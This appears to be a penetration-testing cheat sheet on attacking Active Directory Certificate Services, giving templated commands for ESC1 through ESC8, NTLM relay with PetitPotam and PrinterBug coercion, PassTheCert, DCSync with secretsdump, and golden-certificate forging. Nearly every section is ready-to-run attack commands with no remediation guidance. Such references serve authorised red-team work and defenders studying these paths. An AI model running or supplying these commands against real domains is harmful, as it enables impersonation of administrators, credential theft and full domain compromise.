# AD CS (Certificate Services) Attacks

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
- [ESC2 - Any Purpose EKU](#esc2---any-purpose-eku)
- [ESC3 - Enrollment Agent Templates](#esc3---enrollment-agent-templates)
- [ESC4 - Vulnerable Certificate Template ACL](#esc4---vulnerable-certificate-template-acl)
- [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6---editf_attributesubjectaltname2)
- [ESC7 - Vulnerable CA ACL](#esc7---vulnerable-ca-acl)
- [ESC8 - NTLM Relay to AD CS HTTP Endpoints](#esc8---ntlm-relay-to-ad-cs-http-endpoints)
- [PassTheCert](#passthecert)
- [Certificate Forging (Golden Certificate)](#certificate-forging-golden-certificate)

---

## Overview

Active Directory Certificate Services (AD CS) is Microsoft's PKI implementation. Misconfigurations can lead to privilege escalation and domain compromise.

| Tool | Description | Platform |
| :--- | :--- | :--- |
| Certipy | Python AD CS exploitation tool | Linux |
| Certify | C# AD CS enumeration/exploitation | Windows |
| ForgeCert | Certificate forging tool | Windows |
| PassTheCert | Authenticate using certificates | Both |

---

## Enumeration

### Certipy (Linux)

> Find Certificate Authorities

```shell
certipy find -u $username@$domain -p '$password' -dc-ip $rhost
```

> Find vulnerable templates

```shell
certipy find -u $username@$domain -p '$password' -dc-ip $rhost -vulnerable
```

> Output to JSON for analysis

```shell
certipy find -u $username@$domain -p '$password' -dc-ip $rhost -vulnerable -json
```

> Find with hash

```shell
certipy find -u $username@$domain -hashes :$nthash -dc-ip $rhost -vulnerable
```

### Certify (Windows)

> Find Certificate Authorities

```powershell
.\Certify.exe cas
```

> Find all templates

```powershell
.\Certify.exe find
```

> Find vulnerable templates

```powershell
.\Certify.exe find /vulnerable
```

> Find templates for current user

```powershell
.\Certify.exe find /vulnerable /currentuser
```

### NetExec

> Enumerate AD CS

```shell
nxc ldap $rhost -u '$username' -p '$password' -M adcs
nxc ldap $rhost -u '$username' -p '$password' -M adcs -o SERVER=$rhost
```

---

## ESC1 - Misconfigured Certificate Templates

**Conditions:**

- Template allows client authentication
- ENROLLEE_SUPPLIES_SUBJECT flag enabled
- Low-privileged user can enroll

### Exploitation with Certipy

> Request certificate as another user (e.g., Administrator)

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template $template_name -upn administrator@$domain
```

> Authenticate with certificate

```shell
certipy auth -pfx administrator.pfx -dc-ip $rhost
```

### Exploitation with Certify + Rubeus

> Request certificate

```powershell
.\Certify.exe request /ca:$ca_server\$ca_name /template:$template_name /altname:Administrator
```

> Convert to PFX

```shell
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

> Request TGT with Rubeus

```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:$pfx_password /ptt
```

---

## ESC2 - Any Purpose EKU

**Conditions:**

- Template has "Any Purpose" EKU or no EKU
- Low-privileged user can enroll

### ESC2 Exploitation

> Same as ESC1

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template $template_name -upn administrator@$domain
```

---

## ESC3 - Enrollment Agent Templates

**Conditions:**

- Template allows enrollment agent
- Another template allows enrollment on behalf of others

### ESC3 Exploitation

> Step 1: Request enrollment agent certificate

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template $enrollment_agent_template
```

> Step 2: Request certificate on behalf of another user

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template $target_template -on-behalf-of '$domain\Administrator' -pfx $enrollment_agent.pfx
```

---

## ESC4 - Vulnerable Certificate Template ACL

**Conditions:**

- Low-privileged user has write access to template

### ESC4 Exploitation

> Modify template to enable ESC1

```shell
certipy template -u $username@$domain -p '$password' -dc-ip $rhost -template $template_name -save-old
```

> Request certificate (now exploitable as ESC1)

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template $template_name -upn administrator@$domain
```

> Restore original template

```shell
certipy template -u $username@$domain -p '$password' -dc-ip $rhost -template $template_name -configuration $template_name.json
```

---

## ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Conditions:**

- CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- Allows specifying SAN in any certificate request

### Check Flag

```shell
certipy find -u $username@$domain -p '$password' -dc-ip $rhost -vulnerable
# Look for: "User Specified SAN" : "Enabled"
```

### Exploitation

> Request certificate with arbitrary SAN

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template User -upn administrator@$domain
```

---

## ESC7 - Vulnerable CA ACL

**Conditions:**

- Low-privileged user has ManageCA or ManageCertificates rights on CA

### Exploitation with ManageCA

> Add officer rights

```shell
certipy ca -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -add-officer $username
```

> Enable SubjectAltRequireUpn flag

```shell
certipy ca -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -enable-template SubCA
```

> Request SubCA certificate

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -template SubCA -upn administrator@$domain
```

> If request is pending, issue it

```shell
certipy ca -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -issue-request $request_id
```

> Retrieve issued certificate

```shell
certipy req -u $username@$domain -p '$password' -dc-ip $rhost -ca $ca_name -retrieve $request_id
```

---

## ESC8 - NTLM Relay to AD CS HTTP Endpoints

**Conditions:**

- HTTP enrollment endpoints enabled (certsrv)
- NTLM authentication allowed

### Setup NTLM Relay

> Start ntlmrelayx targeting AD CS

```shell
impacket-ntlmrelayx -t http://$ca_server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Coerce Authentication

> PetitPotam

```shell
python3 PetitPotam.py -u $username -p '$password' -d $domain $lhost $dc_ip
```

> PrinterBug

```shell
python3 printerbug.py $domain/$username:'$password'@$dc_ip $lhost
```

### Use Captured Certificate

> Authenticate with certificate

```shell
certipy auth -pfx $dc_certificate.pfx -dc-ip $rhost
```

> DCSync with obtained hash

```shell
impacket-secretsdump -hashes :$nthash $domain/$dc_hostname\$@$rhost
```

---

## PassTheCert

### Using Certipy

> Authenticate and get TGT

```shell
certipy auth -pfx $certificate.pfx -dc-ip $rhost
```

> Authenticate and get NT hash

```shell
certipy auth -pfx $certificate.pfx -dc-ip $rhost -ldap-shell
```

### Using PassTheCert.py

> LDAP Shell

```shell
python3 passthecert.py -action ldap-shell -crt $certificate.crt -key $certificate.key -domain $domain -dc-ip $rhost
```

> Add user to group

```shell
python3 passthecert.py -action modify_user -crt $certificate.crt -key $certificate.key -domain $domain -dc-ip $rhost -target $username -new-pass '$new_password'
```

### Extract Key and Cert from PFX

> Extract private key

```shell
openssl pkcs12 -in cert.pfx -nocerts -out cert.key -nodes
```

> Extract certificate

```shell
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.crt
```

---

## Certificate Forging (Golden Certificate)

**Requirements:**

- CA private key and certificate (from CA server compromise)

### Backup CA Key (on CA server)

```powershell
# Backup CA certificate and key
certsrv.msc
# Right-click CA > All Tasks > Back up CA > Select "Private key and CA certificate"
```

### Forge Certificate with ForgeCert

```powershell
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword $password --Subject "CN=Administrator,CN=Users,DC=$domain,DC=local" --SubjectAltName "administrator@$domain" --NewCertPath admin_forged.pfx --NewCertPassword $password
```

### Forge Certificate with Certipy

> Forge administrator certificate

```shell
certipy forge -ca-pfx ca.pfx -upn administrator@$domain -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'
```

> Authenticate with forged certificate

```shell
certipy auth -pfx administrator_forged.pfx -dc-ip $rhost
```

---

## Quick Reference

### Common Attack Chain

```text
1. Enumerate: certipy find -vulnerable
2. Identify ESC vulnerability
3. Request malicious certificate
4. Authenticate with certificate
5. DCSync or lateral movement
```

### Certificate Authentication

| Tool | Command |
| :--- | :--- |
| Certipy | `certipy auth -pfx cert.pfx -dc-ip $rhost` |
| Rubeus | `Rubeus.exe asktgt /user:$user /certificate:cert.pfx /ptt` |
| PKINITtools | `python3 gettgtpkinit.py $domain/$user -cert-pfx cert.pfx out.ccache` |

### Useful Resources

- [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [AD CS Attack Paths (HackTricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates)

---

## See Also

- **[AD Exploitation](3.1.AD-Exploitation.md)** - AD enumeration, ACL abuse, GPO abuse
- **[Kerberos Attacks](3.3.Kerberos-Attacks.md)** - Golden/Silver Tickets, DCSync
- **[NTLM Relay](3.4.NTLM-Relay-and-Responder.md)** - ESC8 relay attacks
- **[Shadow Credentials](3.6.Shadow-Credentials.md)** - Certificate-based authentication
- **[Password Attacks](3.2.Password-Attacks.md)** - Credential cracking
